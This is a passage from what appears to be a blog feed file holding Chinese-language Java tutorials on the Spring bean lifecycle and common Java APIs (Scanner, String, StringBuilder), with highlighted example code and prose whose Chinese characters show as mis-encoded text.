class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//è¡¨ç¤ºbeanåˆå§‹åŒ–å¯¹åº”çš„æ“ä½œ</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"init..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">//è¡¨ç¤ºbeané”€æ¯å‰å¯¹åº”çš„æ“ä½œ</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destory</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"destory..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><ul><li>applicationContext.xmlé…ç½®</li></ul><pre class="line-numbers language-xml" data-language="xml"><code class="language-xml"><span class="token comment">&lt;!--init-methodï¼šè®¾ç½®beanåˆå§‹åŒ–ç”Ÿå‘½å‘¨æœŸå›è°ƒå‡½æ•°,æ­¤å¤„å¡«å†™initæ–¹æ³•å--&gt;</span><span class="token comment">&lt;!--destroy-methodï¼šè®¾ç½®beané”€æ¯ç”Ÿå‘½å‘¨æœŸå›è°ƒå‡½æ•°ï¼Œä»…é€‚ç”¨äºå•ä¾‹å¯¹è±¡ï¼Œæ­¤å¤„å¡«å†™destoryæ–¹æ³•å--&gt;</span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>bean</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>bookDao<span class="token punctuation">"</span></span> <span class="token attr-name">class</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>com.itheima.dao.impl.BookDaoImpl<span class="token punctuation">"</span></span> <span class="token attr-name">init-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>init<span class="token punctuation">"</span></span> <span class="token attr-name">destroy-method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>destory<span class="token punctuation">"</span></span><span class="token punctuation">/&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><ul><li>AppForLifeCycleæµ‹è¯•ç±»</li></ul><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">AppForLifeCycle</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//æ­¤å¤„éœ€è¦ä½¿ç”¨å®ç°ç±»ç±»å‹ï¼Œæ¥å£ç±»å‹æ²¡æœ‰closeæ–¹æ³•</span>        <span class="token class-name">ClassPathXmlApplicationContext</span> ctx <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">ClassPathXmlApplicationContext</span><span class="token punctuation">(</span><span class="token string">"applicationContext.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">BookDao</span> bookDao <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token class-name">BookDao</span><span class="token punctuation">)</span> ctx<span class="token punctuation">.</span><span class="token function">getBean</span><span class="token punctuation">(</span><span class="token string">"bookDao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">//å…³é—­å®¹å™¨ï¼Œæ‰§è¡Œé”€æ¯çš„æ–¹æ³•</span>        ctx<span class="token punctuation">.</span><span class="token function">close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸæœ¬<code>ApplicationContext</code>ç±»ä¸­æ²¡æœ‰<code>close()</code>æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦æ¢æˆ<code> ClassPathXmlApplicationContext</code>ç±»ï¼Œå…¶ä¸­<code>ClassPathXmlApplicationContext</code>ç»§æ‰¿äº†</p><p><code>ApplicationContext</code>ï¼Œè€Œ<code>ApplicationContext</code>ä»…ä»…æ˜¯ä¸ªæ¥å£</p><blockquote><p>ä¹Ÿå¯ä»¥è°ƒç”¨ä¸€ä¸ªå…³é—­â€œé’©å­â€ï¼š<code>registerShutdownHook</code>æ–¹æ³•ï¼Œå®ƒæ¯”<code>close</code>æ›´åŠ æ¸©å’Œã€‚</p><p>åœ¨Webåº”ç”¨ä¸­ï¼Œå®¹å™¨çš„å…³é—­åº”äºTomcatåŒæ­¥ï¼ˆè¿™äº›å…³é—­å®¹å™¨çš„æ–¹æ³•å¯ä»¥ä¸ç”¨careï¼‰ã€‚</p></blockquote><h4 id="Beanç”Ÿå‘½å‘¨æœŸæ§åˆ¶ï¼š"><a href="#Beanç”Ÿå‘½å‘¨æœŸæ§åˆ¶ï¼š" class="headerlink" title="Beanç”Ÿå‘½å‘¨æœŸæ§åˆ¶ï¼š"></a>Beanç”Ÿå‘½å‘¨æœŸæ§åˆ¶ï¼š</h4><p>ä¸ºäº†æ›´åŠ æ–¹ä¾¿æ“ä½œï¼Œçœç•¥<code>init-method</code>å’Œ<code>destroy-method</code>è¿™ä¸¤ä¸ªé…ç½®ï¼Œå¯ä»¥ä½¿ç”¨Springæä¾›çš„æ¥å£ã€‚</p><p><strong>å®ç°InitializingBean, DisposableBeanæ¥å£ï¼š</strong></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">BookServiceImpl</span> <span class="token keyword">implements</span> <span class="token class-name">BookService</span><span class="token punctuation">,</span> <span class="token class-name">InitializingBean</span><span class="token punctuation">,</span> <span class="token class-name">DisposableBean</span> <span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token class-name">BookDao</span> bookDao<span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBookDao</span><span class="token punctuation">(</span><span class="token class-name">BookDao</span> bookDao<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"set ....."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">this</span><span class="token punctuation">.</span>bookDao <span class="token operator">=</span> bookDao<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"book service save ..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        bookDao<span class="token punctuation">.</span><span class="token function">save</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">destroy</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"service destroy"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">afterPropertiesSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">{</span>          <span class="token comment">//afterPropertiesSetåœ¨é…ç½®è®¾ç½®å¥½ä¹‹åå†æ‰§è¡Œï¼Œæ„ä¸ºå…ˆæ‰“å°â€œsetâ€å†æ‰“//å°"service init"</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"service init"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ‰€ä»¥</p><blockquote><ul><li>åˆå§‹åŒ–å®¹å™¨</li></ul><ol><li>åˆ›å»ºå¯¹è±¡ï¼ˆå†…å­˜åˆ†é…ï¼‰</li><li>æ‰§è¡Œæ„é€ æ–¹æ³•</li><li>æ‰§è¡Œå±æ€§æ³¨å…¥ï¼ˆsetæ“ä½œï¼‰</li><li>æ‰§è¡Œbeanåˆå§‹åŒ–æ–¹æ³•</li></ol><ul><li>ä½¿ç”¨bean</li></ul><ol><li>æ‰§è¡Œä¸šåŠ¡æ“ä½œ</li></ol><ul><li>å…³é—­/é”€æ¯å®¹å™¨</li></ul><ol><li>æ‰§è¡Œbeané”€æ¯æ–¹æ³•</li></ol></blockquote><h4 id="Beané”€æ¯æ—¶æœºï¼š"><a href="#Beané”€æ¯æ—¶æœºï¼š" class="headerlink" title="Beané”€æ¯æ—¶æœºï¼š"></a>Beané”€æ¯æ—¶æœºï¼š</h4><ul><li>å®¹å™¨å…³é—­å‰è§¦å‘beançš„é”€æ¯</li><li>å…³é—­å®¹å™¨æ–¹å¼ï¼š<ul><li><p>æ‰‹å·¥å…³é—­å®¹å™¨<br><code>ConfigurableApplicationContext</code>æ¥å£<code>close()</code>æ“ä½œ</p></li><li><p>æ³¨å†Œå…³é—­é’©å­ï¼Œåœ¨è™šæ‹Ÿæœºé€€å‡ºå‰å…ˆå…³é—­å®¹å™¨å†é€€å‡ºè™šæ‹Ÿæœº<br><code>ConfigurableApplicationContext</code>æ¥å£<code>registerShutdownHook()</code>æ“ä½œ</p><p>â€‹                                                                                                                                                                                                                                        æœªå®Œå¾…ç»­ã€‚ã€‚ã€‚</p></li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Java </tag>
            
            <tag> JavaEE </tag>
            
            <tag> Spring </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javaå¸¸ç”¨APIï¼ˆä¸€ï¼‰</title>
      <link href="/2022/03/29/java-chang-yong-api/"/>
      <url>/2022/03/29/java-chang-yong-api/</url>
      
        <content type="html"><![CDATA[<h2 id="é”®ç›˜å½•å…¥"><a href="#é”®ç›˜å½•å…¥" class="headerlink" title="é”®ç›˜å½•å…¥"></a>é”®ç›˜å½•å…¥</h2><p>éœ€è¦å¼•å…¥æ¨¡å—<code>java.util.Scanner</code></p><p><strong>Scannerç±» :</strong></p><p>â€‹    next() : é‡åˆ°äº†ç©ºæ ¼, å°±ä¸å†å½•å…¥æ•°æ®äº† , ç»“æŸæ ‡è®°: ç©ºæ ¼, tabé”®</p><p>â€‹    nextLine() : å¯ä»¥å°†æ•°æ®å®Œæ•´çš„æ¥æ”¶è¿‡æ¥ , ç»“æŸæ ‡è®°: å›è½¦æ¢è¡Œç¬¦</p><p>â€‹    nextInt()ï¼šåªè¯»å–æ•°å€¼</p><p>ä»£ç æ ·ä¾‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Demo1Scanner</span> <span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">// 1. åˆ›å»ºScannerå¯¹è±¡</span>        <span class="token class-name">Scanner</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 2. è°ƒç”¨nextLineæ–¹æ³•æ¥æ”¶å­—ç¬¦ä¸²</span>        <span class="token comment">// ctrl + alt + v : å¿«é€Ÿç”Ÿæˆæ–¹æ³•çš„è¿”å›å€¼</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="Stringç±»"><a href="#Stringç±»" class="headerlink" title="Stringç±»"></a>Stringç±»</h2><blockquote><ol><li><p>String ç±»åœ¨ java.lang åŒ…ä¸‹ï¼Œæ‰€ä»¥ä½¿ç”¨çš„æ—¶å€™ä¸éœ€è¦å¯¼åŒ…</p></li><li><p>String ç±»ä»£è¡¨å­—ç¬¦ä¸²ï¼ŒJava ç¨‹åºä¸­çš„æ‰€æœ‰å­—ç¬¦ä¸²æ–‡å­—éƒ½è¢«å®ç°ä¸ºæ­¤ç±»çš„å®ä¾‹ä¹Ÿå°±æ˜¯è¯´ï¼ŒJava ç¨‹åºä¸­æ‰€æœ‰çš„åŒå¼•å·å­—ç¬¦ä¸²ï¼Œéƒ½æ˜¯ String ç±»çš„å¯¹è±¡</p></li><li><p>å­—ç¬¦ä¸²ä¸å¯å˜ï¼Œå®ƒä»¬çš„å€¼åœ¨åˆ›å»ºåä¸èƒ½è¢«æ›´æ”¹ï¼Œæ”¹å˜ä¹Ÿæ˜¯å¯¹è±¡çš„æ›¿æ¢è€Œå·²</p></li></ol></blockquote><h4 id="Stringç±»çš„æ„é€ æ–¹æ³•"><a href="#Stringç±»çš„æ„é€ æ–¹æ³•" class="headerlink" title="Stringç±»çš„æ„é€ æ–¹æ³•"></a>Stringç±»çš„æ„é€ æ–¹æ³•</h4><img src="1590939947722.png" style="zoom:80%;"><h4 id="åˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡çš„åŒºåˆ«å¯¹æ¯”"><a href="#åˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡çš„åŒºåˆ«å¯¹æ¯”" class="headerlink" title="åˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡çš„åŒºåˆ«å¯¹æ¯”"></a>åˆ›å»ºå­—ç¬¦ä¸²å¯¹è±¡çš„åŒºåˆ«å¯¹æ¯”</h4><ul><li><p><strong>é€šè¿‡æ„é€ æ–¹æ³•åˆ›å»º</strong></p><p>â€‹    é€šè¿‡ new åˆ›å»ºçš„å­—ç¬¦ä¸²å¯¹è±¡ï¼Œæ¯ä¸€æ¬¡ new éƒ½ä¼šç”³è¯·ä¸€ä¸ªå†…å­˜ç©ºé—´ï¼Œè™½ç„¶å†…å®¹ç›¸åŒï¼Œä½†æ˜¯åœ°å€å€¼ä¸åŒ</p></li><li><p><strong>ç›´æ¥èµ‹å€¼æ–¹å¼åˆ›å»º</strong></p><p>â€‹    ä»¥â€œâ€æ–¹å¼ç»™å‡ºçš„å­—ç¬¦ä¸²ï¼Œåªè¦å­—ç¬¦åºåˆ—ç›¸åŒ(é¡ºåºå’Œå¤§å°å†™)ï¼Œæ— è®ºåœ¨ç¨‹åºä»£ç ä¸­å‡ºç°å‡ æ¬¡ï¼ŒJVM éƒ½åªä¼šå»ºç«‹ä¸€ä¸ª String å¯¹è±¡ï¼Œå¹¶åœ¨å­—ç¬¦ä¸²æ± ä¸­ç»´æŠ¤</p></li></ul><ul><li>å½“å­—ç¬¦ä¸²æ‹¼æ¥æ—¶ï¼Œç”¨â€œ+â€ï¼Œç³»ç»Ÿä¼šåˆ›å»ºä¸€ä¸ªStringBuilderå¯¹è±¡ï¼Œå†è°ƒç”¨appendæ–¹æ³•å®Œæˆæ‹¼æ¥ï¼Œå†ç”¨toStringçš„æ–¹æ³•è½¬æ¢ä¸ºStringç±»å‹</li></ul><h4 id="å­—ç¬¦ä¸²çš„æ¯”è¾ƒ"><a href="#å­—ç¬¦ä¸²çš„æ¯”è¾ƒ" class="headerlink" title="å­—ç¬¦ä¸²çš„æ¯”è¾ƒ"></a>å­—ç¬¦ä¸²çš„æ¯”è¾ƒ</h4><ul><li><p><strong>public boolean equals(String s)</strong>     æ¯”è¾ƒä¸¤ä¸ªå­—ç¬¦ä¸²å†…å®¹æ˜¯å¦ç›¸åŒã€åŒºåˆ†å¤§å°å†™</p></li><li><p>== æ¯”è¾ƒåŸºæœ¬æ•°æ®ç±»å‹ï¼šæ¯”è¾ƒçš„æ˜¯å…·ä½“çš„å€¼</p></li></ul><p><img src="/2022/03/29/java-chang-yong-api/image-20220320151957710.png"></p><ul><li>== æ¯”è¾ƒå¼•ç”¨æ•°æ®ç±»å‹ï¼šæ¯”è¾ƒçš„æ˜¯å¯¹è±¡åœ°å€å€¼</li></ul><p><img src="/2022/03/29/java-chang-yong-api/image-20220320152010229.png"></p><h4 id="å­—ç¬¦ä¸²æˆªå–"><a href="#å­—ç¬¦ä¸²æˆªå–" class="headerlink" title="å­—ç¬¦ä¸²æˆªå–"></a>å­—ç¬¦ä¸²æˆªå–</h4><p><strong>subString()æ–¹æ³•</strong></p><blockquote><p><strong>åªä¼ ä¸€ä¸ªå‚æ•°ï¼šsubString(int beginIndex)ï¼š</strong>å°†å­—ç¬¦ä¸²ä»ç´¢å¼•å·ä¸ºbeginIndexå¼€å§‹æˆªå–ï¼Œä¸€ç›´åˆ°å­—ç¬¦ä¸²æœ«å°¾ã€‚ï¼ˆæ³¨æ„ç´¢å¼•å€¼ä»0å¼€å§‹ï¼‰</p><p><strong>ä¼ å…¥ä¸¤ä¸ªå‚æ•°ï¼šsubstring(int beginIndex, int endIndex)ï¼š</strong>ä»ç´¢å¼•å·<strong>beginIndex</strong>å¼€å§‹åˆ°ç´¢å¼•å·<strong>endIndex</strong>ç»“æŸ</p></blockquote><p><strong>public String[] split(String regex)ï¼š</strong>  æ ¹æ®ä¼ å…¥çš„è§„åˆ™åˆ‡å‰²å­—ç¬¦ä¸²ï¼Œå¾—åˆ°å­—ç¬¦ä¸²æ•°ç»„</p><p>æ ·ä¾‹ï¼š<code>String[] sArr = str.split(",");</code>ï¼š æ ¹æ®é€—å·åˆ‡å‰²å­—ç¬¦ä¸²</p><h4 id="å­—ç¬¦ä¸²éå†"><a href="#å­—ç¬¦ä¸²éå†" class="headerlink" title="å­—ç¬¦ä¸²éå†"></a>å­—ç¬¦ä¸²éå†</h4><p><strong>public char charAt(int index)</strong>  ï¼šè¿”å›æŒ‡å®šç´¢å¼•å¤„çš„ char å€¼</p><p>ä»£ç æ ·ä¾‹ï¼ˆéå†å­—ç¬¦ä¸²ï¼‰ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">Scanner</span><span class="token punctuation">;</span><span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Test2</span> <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token comment">//  1. é”®ç›˜å½•å…¥ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œç”¨ Scanner å®ç°</span>        <span class="token class-name">Scanner</span> sc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Scanner</span><span class="token punctuation">(</span><span class="token class-name">System</span><span class="token punctuation">.</span>in<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span><span class="token string">"è¯·è¾“å…¥:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> sc<span class="token punctuation">.</span><span class="token function">nextLine</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment">// 2. éå†å­—ç¬¦ä¸²ï¼Œé¦–å…ˆè¦èƒ½å¤Ÿè·å–åˆ°å­—ç¬¦ä¸²ä¸­çš„æ¯ä¸€ä¸ªå­—ç¬¦</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> s<span class="token punctuation">.</span><span class="token function">length</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token comment">// i : å­—ç¬¦ä¸²çš„æ¯ä¸€ä¸ªç´¢å¼•</span>            <span class="token keyword">char</span> c <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span>    or        <span class="token keyword">public</span> <span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token class-name">String</span> s <span class="token operator">=</span> <span class="token string">"abcdefg"</span><span class="token punctuation">;</span>        <span class="token keyword">char</span><span class="token punctuation">[</span><span class="token punctuation">]</span> chars <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">toCharArray</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//ç”Ÿæˆä¸€ä¸ªå­—ç¬¦æ•°ç»„</span>        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> chars<span class="token punctuation">.</span>length<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token class-name">System</span><span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>chars<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="å…¶ä»–çš„å¸¸ç”¨æ–¹æ³•ï¼š"><a href="#å…¶ä»–çš„å¸¸ç”¨æ–¹æ³•ï¼š" class="headerlink" title="å…¶ä»–çš„å¸¸ç”¨æ–¹æ³•ï¼š"></a>å…¶ä»–çš„å¸¸ç”¨æ–¹æ³•ï¼š</h4><p><strong>public String concat(String str)ï¼š</strong>å°†å‚æ•°ä¸­çš„å­—ç¬¦ä¸²strè¿æ¥åˆ°å½“å‰å­—ç¬¦ä¸²çš„åé¢ï¼Œæ•ˆæœç­‰ä»·äºâ€+â€ã€‚</p><p><strong>public int compareTo(String anotherString)ï¼š</strong>è¯¥æ–¹æ³•æ˜¯å¯¹å­—ç¬¦ä¸²å†…å®¹æŒ‰å­—å…¸é¡ºåºè¿›è¡Œå¤§å°æ¯”è¾ƒï¼Œé€šè¿‡è¿”å›çš„æ•´æ•°å€¼æŒ‡æ˜å½“å‰å­—ç¬¦ä¸²ä¸å‚æ•°å­—ç¬¦ä¸²çš„å¤§å°å…³ç³»ã€‚è‹¥å½“å‰å¯¹è±¡æ¯”å‚æ•°å¤§åˆ™è¿”å›æ­£æ•´æ•°ï¼Œåä¹‹è¿”å›è´Ÿæ•´æ•°ï¼Œç›¸ç­‰è¿”å›0ã€‚</p><p><strong>String trim()ï¼š</strong>æˆªå»å­—ç¬¦ä¸²ä¸¤ç«¯çš„ç©ºæ ¼ï¼Œä½†å¯¹äºä¸­é—´çš„ç©ºæ ¼ä¸å¤„ç†ã€‚</p><p><strong>contains(String str)ï¼š</strong>åˆ¤æ–­å‚æ•°sæ˜¯å¦è¢«åŒ…å«åœ¨å­—ç¬¦ä¸²ä¸­ï¼Œå¹¶è¿”å›ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„å€¼ã€‚</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">String</span> str <span class="token operator">=</span> <span class="token string">"student"</span><span class="token punctuation">;</span>str<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"stu"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//true</span>str<span class="token punctuation">.</span><span class="token function">contains</span><span class="token punctuation">(</span><span class="token string">"ok"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//false</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>åŸºæœ¬ç±»å‹è½¬æ¢ä¸ºå­—ç¬¦ä¸²ç±»å‹</strong></p><blockquote><p><strong>String valueOf(æ•°æ®ç±»å‹)ï¼š</strong></p><pre class="line-numbers language-none"><code class="language-none">&gt;String s1 = String.valueOf(12);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p><strong>è¿›åˆ¶è½¬æ¢</strong></p><blockquote><p>ä½¿ç”¨Longç±»ä¸­çš„æ–¹æ³•å¾—åˆ°æ•´æ•°ä¹‹é—´çš„å„ç§è¿›åˆ¶è½¬æ¢çš„æ–¹æ³•ï¼š<br><strong>Long.toBinaryString(long l)<br>Long.toOctalString(long l)<br>Long.toHexString(long l)<br>Long.toString(long l, int p)ï¼š</strong>pä½œä¸ºä»»æ„è¿›åˆ¶</p></blockquote><h2 id="StringBuilderç±»"><a href="#StringBuilderç±»" class="headerlink" title="StringBuilderç±»"></a>StringBuilderç±»</h2><blockquote><p>StringBuilder æ˜¯ä¸€ä¸ªå¯å˜çš„å­—ç¬¦ä¸²ç±»ï¼Œæˆ‘ä»¬å¯ä»¥æŠŠå®ƒçœ‹æˆæ˜¯ä¸€ä¸ªå®¹å™¨ï¼Œè¿™é‡Œçš„å¯å˜æŒ‡çš„æ˜¯ StringBuilder å¯¹è±¡ä¸­çš„å†…å®¹æ˜¯å¯å˜çš„</p></blockquote><h4 id="StringBuilderç±»å’ŒStringç±»çš„åŒºåˆ«"><a href="#StringBuilderç±»å’ŒStringç±»çš„åŒºåˆ«" class="headerlink" title="StringBuilderç±»å’ŒStringç±»çš„åŒºåˆ«"></a>StringBuilderç±»å’ŒStringç±»çš„åŒºåˆ«</h4><blockquote><p><strong>Stringç±»ï¼š</strong>å†…å®¹æ˜¯ä¸å¯å˜çš„</p><p><strong>StringBuilderç±»ï¼š</strong>å†…å®¹æ˜¯å¯å˜çš„</p></blockquote><h4 id="StringBuilderç±»çš„æ„é€ æ–¹æ³•"><a href="#StringBuilderç±»çš„æ„é€ æ–¹æ³•" class="headerlink" title="StringBuilderç±»çš„æ„é€ æ–¹æ³•"></a>StringBuilderç±»çš„æ„é€ æ–¹æ³•</h4><table><thead><tr><th>æ–¹æ³•å</th><th>è¯´æ˜</th></tr></thead><tbody><tr><td>public StringBuilder()</td><td>åˆ›å»ºä¸€ä¸ªç©ºç™½å¯å˜å­—ç¬¦ä¸²å¯¹è±¡ï¼Œä¸å«æœ‰ä»»ä½•å†…å®¹</td></tr><tr><td>public StringBuilder(String   str)</td><td>æ ¹æ®å­—ç¬¦ä¸²çš„å†…å®¹ï¼Œæ¥åˆ›å»ºå¯å˜å­—ç¬¦ä¸²å¯¹è±¡</td></tr></tbody></table><p>ä»£ç æ ·ä¾‹ï¼š</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token class-name">StringBuilder</span> str 